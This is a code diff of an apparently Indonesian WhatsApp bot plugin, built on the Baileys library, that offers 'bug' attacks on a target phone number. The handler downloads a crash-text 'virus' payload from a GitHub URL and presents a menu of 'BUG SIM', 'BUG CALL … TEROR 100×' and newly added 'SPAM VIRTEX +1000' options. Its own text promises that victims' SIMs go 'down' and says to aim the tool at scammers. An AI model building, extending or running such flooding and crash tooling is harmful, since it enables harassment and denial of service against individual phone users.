@@ -4,7 +4,7 @@ import { sticker } from '../lib/sticker.js'
 
 const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGUNAKAN UNTUK RIPPER ATAU SCAMER!',
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\n*INGAT! FITUR INI BUKAN FITUR BUGWA',
  `)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
@@ -15,20 +15,21 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	//const participants = m.isGroup ? await groupMetadata.participants : ''
 	let q = `Bug Tag From ${author}\n${text}`
 	let sections = [{
-		title: ' MENU BUG EKSTRIMS 💀',
+		title: ' MENU BUG SMARTPHONE 💀',
 rows: [
 {title: `'😈⛓BUG SIM SIMPATI𝒇̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
 {title: `😈⛓BUG SIM TELKOMSEL𝒄̶̶̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
 {title: `'😈⛓BUG SIM TRI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
 {title: `'😈⛓BUG SIM SMARTFREN 𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
 {title: `😈⛓BUG SIM INDOSAT𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO BUG"},
-{title: `😈⛓BUG CALL SIMPATI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR?"},
-{title: `😈⛓BUG CALL TELKOMSEL𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR"},
-{title: `😈⛓BUG CALL TRI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR"},
-{title: `😈⛓BUG CALL SMARTFREN𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR"},
-{title: `😈⛓BUG CALL INDOSAT𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR"},]}]
+{title: `😈⛓BUG CALL SIMPATI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
+{title: `😈⛓BUG CALL TELKOMSEL𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
+{title: `😈⛓BUG CALL TRI𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
+{title: `😈⛓BUG CALL SMARTFREN𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
+{title: `😈⛓BUG CALL INDOSAT𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO TEROR 100×"},
+{title: `😈⛓SPAM VIRTEX +1000𝒏̶᭄࿐ꪶ😈`, rowId: ".unban", description: "LET'S GO SPAM VIRTEX 1000×"},]}]
     let listMessage = {
-      text: 'HATI-HATI OWNER❗ Jangan di gunakan dengan sembarangan, karena fitur ini sangat berbahaya jangan anda mencoba memakai nomor hp anda disebabkan nomor anda diteror, nomor SIM anda akan mendapatkan *TERORAN ERROR* yang sangat tragis dan menyebabkan down atau disebut riset SIM. *GUNAKAN UNTUK RIPPER ATAU SCAMER!*. Terimakasih telah Membaca Owner WannTrue BOT',
+      text: 'HATI-HATI DENGAN FITUR BUG SIM OWNER❗ Jangan di gunakan dengan sembarangan, karena fitur ini sangat berbahaya jangan anda mencoba memakai nomor hp anda disebabkan nomor anda diteror, nomor SIM anda akan mendapatkan *TERORAN ERROR* yang sangat tragis dan menyebabkan down atau disebut riset SIM. Fitur bug ini bukan khusus wa tetapi nomor telepon/sim. *GUNAKAN UNTUK RIPPER ATAU SCAMER!*. Terimakasih telah Membaca Owner WannTrue BOT',
       footer: '*➳😈⛓⚔w̆̈e̶ WannTrue࿐ꪶ😈',
       buttonText: 'Silakam diklik Wann👿🔥̶',
       sections
